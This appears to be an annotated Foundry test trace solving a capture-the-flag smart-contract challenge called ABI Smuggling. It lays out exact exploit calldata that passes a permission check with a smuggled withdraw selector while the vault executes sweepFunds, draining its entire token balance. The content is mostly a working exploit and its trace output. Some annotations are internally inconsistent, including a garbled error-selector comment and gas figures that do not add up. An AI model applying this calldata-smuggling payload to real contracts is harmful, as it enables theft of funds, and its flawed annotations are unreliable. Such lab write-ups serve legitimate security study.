/*
 forge test --match-path ABISmuggling.t.sol -vvvv

╔══════════════════════════════════════════════════════════════════════════════╗
║                     ABI SMUGGLING — TEST RUN ANNOTATION                     ║
║                                                                              ║
║  Core vulnerability:                                                         ║
║    execute() extracts the permission-checked selector from a FIXED byte      ║
║    offset in calldata (bytes [100:104]).  The ABI decoder, however, finds    ║
║    the real actionData at whatever offset the first dynamic argument         ║
║    pointer says — here 0x80 (128), placing real data at bytes [132:].       ║
║    By filling bytes [100:132] with the allowed selector and placing the      ║
║    forbidden selector at bytes [164:168] (inside actionData), the attacker   ║
║    passes the permission check while the vault executes a different call.    ║
║                                                                              ║
║  Both tests pass.  Reading the traces top-down shows exactly how the exploit ║
║  bypasses the permission check and drains the vault in a single call.        ║
╚══════════════════════════════════════════════════════════════════════════════╝

[⠊] Compiling...
[⠒] Compiling 3 files with Solc 0.8.25
[⠢] Solc 0.8.25 finished in 1.03s
Compiler run successful!

Ran 2 tests for test/abi-smuggling/ABISmuggling.t.sol:ABISmugglingChallenge

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TEST 1 — EXPLOIT  (gas: 54,896)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_abiSmuggling() (gas: 54896)
Traces:
  [62496] ABISmugglingChallenge::test_abiSmuggling()
  │
  │  // ── Forge impersonates the player for the duration of the test ──────────
  ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], ...)
  │   └─ ← [Return]
  │
  │  // ── THE EXPLOIT CALL ─────────────────────────────────────────────────────
  │  //
  │  // A raw .call() sends hand-crafted calldata directly to the vault.
  │  // The outer 4-byte selector "1cff79cd" is execute() — the only public
  │  // entry point that the player is expected to use.
  │  //
  │  // ┌─────────────────────────────────────────────────────────────────────┐
  │  // │              CALLDATA LAYOUT  (byte offsets from byte 0)            │
  │  // ├────────────┬────────────────────────────────────────────────────────┤
  │  // │ [0   : 4 ] │ 1cff79cd  — execute() selector                        │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [4   :36 ] │ 0000…vault_addr                                        │
  │  // │            │   ABI arg 0: target address (the vault itself)         │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [36  :68 ] │ 0000…0080  (= 128 decimal)                             │
  │  // │            │   ABI arg 1: byte offset of actionData, measured from  │
  │  // │            │   byte 4 (start of ABI args).                          │
  │  // │            │   → actionData is at absolute byte 4 + 128 = 132.      │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [68  :100] │ 0000…0000  — 32 bytes of padding / filler              │
  │  // │            │   The ABI decoder skips this region entirely because    │
  │  // │            │   it has already been told actionData starts at 132.    │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [100 :132] │ d9caed12 0000…0000  — *** SMUGGLED SELECTOR ***        │
  │  // │            │                                                         │
  │  // │            │   execute() reads bytes4 at this FIXED offset to get   │
  │  // │            │   the "action selector" for the permission check.       │
  │  // │            │   d9caed12 = withdraw() — player IS allowed to call it. │
  │  // │            │   Permission check: getActionId(d9caed12, player, vault)│
  │  // │            │   → PASS ✔                                              │
  │  // │            │                                                         │
  │  // │            │   The ABI decoder never reads this word; it sits in     │
  │  // │            │   the gap between the offset pointer and actionData.    │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [132 :164] │ 0000…0044  (= 68 decimal)                              │
  │  // │            │   actionData length field: 68 bytes of payload follow.  │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [164 :168] │ 85fb709d  — sweepFunds() selector        ← REAL CALL   │
  │  // │            │   This is what execute() actually forwards to the vault.│
  │  // │            │   sweepFunds has NO withdrawal cap and NO time lock.    │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [168 :200] │ 0000…recovery_addr — arg0: recipient of stolen funds    │
  │  // ├────────────┼────────────────────────────────────────────────────────┤
  │  // │ [200 :232] │ 0000…token_addr    — arg1: token to drain               │
  │  // └────────────┴────────────────────────────────────────────────────────┘
  │  //
  │  // Summary:
  │  //   Permission check sees:  withdraw   (d9caed12) → allowed for player ✔
  │  //   Vault actually executes: sweepFunds (85fb709d) → NOT allowed, but never checked
  │
  ├─ [43218] SelfAuthorizedVault::1cff79cd(
  │            // target (vault calls itself via execute)
  │            0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
  │            // actionData offset pointer = 0x80 (128) — tells ABI decoder to skip to byte 132
  │            0000000000000000000000000000000000000000000000000000000000000080
  │            // 32-byte filler — ABI decoder ignores; execute()'s fixed-offset read lands here
  │            0000000000000000000000000000000000000000000000000000000000000000
  │            // smuggled selector d9caed12 (withdraw) — seen by permission check, not by decoder
  │            d9caed1200000000000000000000000000000000000000000000000000000000
  │            // actionData length = 68 bytes
  │            0000000000000000000000000000000000000000000000000000000000000044
  │            // sweepFunds selector (85fb709d) — the call that actually executes
  │            85fb709d
  │            // arg0: recovery address
  │            00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
  │            // arg1: token address
  │            0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
  │          )
  │  │
  │  │  // ── Inside execute() ─────────────────────────────────────────────────
  │  │  //
  │  │  // Three guards are cleared before the forwarded call is made:
  │  │  //
  │  │  //  Guard 1 — Permission check
  │  │  //    getActionId(d9caed12 /*withdraw*/, player, vault) was pre-authorised
  │  │  //    during setUp. Check passes. ✔
  │  │  //
  │  │  //  Guard 2 — _beforeFunctionCall
  │  │  //    target == address(this) (vault calling itself). Check passes. ✔
  │  │  //
  │  │  //  Guard 3 — onlyThis (inside sweepFunds)
  │  │  //    execute() performs vault.call(actionData), so msg.sender inside
  │  │  //    sweepFunds == address(vault). Check passes. ✔
  │  │  //
  │  │  // sweepFunds itself has no cap and no cooldown → full balance transferred.
  │  │
  │  ├─ [33733] SelfAuthorizedVault::sweepFunds(
  │  │            recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │            DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
  │  │          )
  │  │  │
  │  │  │  // ── Step 1: read vault balance ───────────────────────────────────
  │  │  │  // staticcall — read-only, no state change yet
  │  │  ├─ [2516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │  │  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // 1,000,000 DVT
  │  │  │
  │  │  │  // ── Step 2: transfer entire balance in one ERC-20 call ───────────
  │  │  │  // withdraw() is capped at 1 ether per call + 15-day cooldown;
  │  │  │  // sweepFunds has neither restriction — all 1,000,000 DVT leave at once.
  │  │  ├─ [27670] DamnValuableToken::transfer(
  │  │  │            recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │  │            1000000000000000000000000 [1e24]
  │  │  │          )
  │  │  │  │
  │  │  │  │  // ERC-20 Transfer event — on-chain proof the drain succeeded
  │  │  │  ├─ emit Transfer(
  │  │  │  │    from:   SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264],
  │  │  │  │    to:     recovery:            [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │  │  │    amount: 1000000000000000000000000 [1e24]   // full vault balance
  │  │  │  │  )
  │  │  │  └─ ← [Return] true
  │  │  └─ ← [Stop]          // sweepFunds has no explicit return value
  │  │
  │  └─ ← [Return] 0x00…    // execute() returns ABI-encoded empty bytes → success
  │
  │  // ── Forge stops impersonating the player ─────────────────────────────────
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]
  │
  │  // ── _isSolved(): vault must be empty ─────────────────────────────────────
  ├─ [516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │   └─ ← [Return] 0                    // vault drained ✔
  ├─ [0] VM::assertEq(0, 0, "Vault still has tokens") [staticcall]
  │   └─ ← [Return]
  │
  │  // ── _isSolved(): recovery must hold all tokens ────────────────────────────
  ├─ [516] DamnValuableToken::balanceOf(recovery: [...]) [staticcall]
  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // all 1,000,000 DVT ✔
  ├─ [0] VM::assertEq(1e24, 1e24, "Not enough tokens in recovery account") [staticcall]
  │   └─ ← [Return]
  │
  └─ ← [Stop]   // test_abiSmuggling PASSED ✔


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TEST 2 — INITIAL STATE SANITY CHECK  (gas: 32,700)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_assertInitialState() (gas: 32700)
Traces:
  [32700] ABISmugglingChallenge::test_assertInitialState()
  │
  │  // ── Vault is initialised ──────────────────────────────────────────────────
  │  // _lastWithdrawalTimestamp is set to block.timestamp during setUp.
  │  // Forge's default block.timestamp == 1, so assertGt(1, 0) holds.
  ├─ [2325] SelfAuthorizedVault::getLastWithdrawalTimestamp() [staticcall]
  │   └─ ← [Return] 1
  ├─ [0] VM::assertGt(1, 0) [staticcall]
  │   └─ ← [Return]
  │
  │  // setPermissions() was called in setUp → initialized flag flipped to true
  ├─ [2299] SelfAuthorizedVault::initialized() [staticcall]
  │   └─ ← [Return] true
  ├─ [0] VM::assertTrue(true) [staticcall]
  │   └─ ← [Return]
  │
  │  // ── Token balances reflect setUp funding ──────────────────────────────────
  ├─ [2516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // vault: 1,000,000 DVT ✔
  ├─ [0] VM::assertEq(1e24, 1e24) [staticcall]
  │   └─ ← [Return]
  │
  ├─ [2516] DamnValuableToken::balanceOf(player: [...]) [staticcall]
  │   └─ ← [Return] 0              // player starts with zero DVT ✔
  ├─ [0] VM::assertEq(0, 0) [staticcall]
  │   └─ ← [Return]
  │
  │  // ── onlyThis blocks all direct calls (no execute() relay) ─────────────────
  │  //
  │  // The onlyThis modifier checks: require(msg.sender == address(this))
  │  // Direct callers (deployer, player) always fail this check before any
  │  // storage is read, which is why gas is <600 per revert probe.
  │  //
  │  // Probe 1: deployer calls sweepFunds directly
  │  //   msg.sender = deployer ≠ vault → CallerNotAllowed() immediately
  ├─ [0] VM::expectRevert(custom error 0xc31eb0e0)
  │  //             selector of CallerNotAllowed() = 0x2af07d20 (first 4 bytes of 0xc31eb0e0…)
  │   └─ ← [Return]
  ├─ [479] SelfAuthorizedVault::sweepFunds(deployer: [...], DamnValuableToken: [...])
  │   └─ ← [Revert] CallerNotAllowed()   // onlyThis fires ✔
  │
  │  // Probe 2: player calls withdraw directly
  │  //   msg.sender = player ≠ vault → CallerNotAllowed() immediately
  │  //   (withdraw also has a 15-day cooldown and 1 ether cap, but those checks
  │  //    are never reached — onlyThis reverts first)
  ├─ [0] VM::prank(player: [...])
  │   └─ ← [Return]
  ├─ [0] VM::expectRevert(custom error 0xc31eb0e0)
  │   └─ ← [Return]
  ├─ [563] SelfAuthorizedVault::withdraw(DamnValuableToken: [...], player: [...], 1e18)
  │   └─ ← [Revert] CallerNotAllowed()   // onlyThis fires ✔
  │
  └─ ← [Stop]   // test_assertInitialState PASSED ✔


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.47ms (1.94ms CPU time)
Ran 1 test suite in 11.62ms (5.47ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

Gas breakdown:
  test_abiSmuggling        54,896 gas total
    ├─ execute() overhead:  ~9,278 gas  (permission check, _beforeFunctionCall, call dispatch)
    └─ sweepFunds relay:    43,218 gas
         ├─ balanceOf:       2,516 gas  (warm SLOAD — already accessed in setUp)
         └─ ERC-20 transfer: 27,670 gas (cold write to recovery's balance slot)

  test_assertInitialState  32,700 gas total
    ├─ getLastWithdrawalTimestamp:  2,325 gas  (single SLOAD)
    ├─ initialized():               2,299 gas  (single SLOAD)
    ├─ balanceOf × 2:               5,032 gas  (warm SLOADs)
    └─ two revert probes:            <600 gas each
         └─ onlyThis reverts before any storage is read → minimal gas consumed
*/
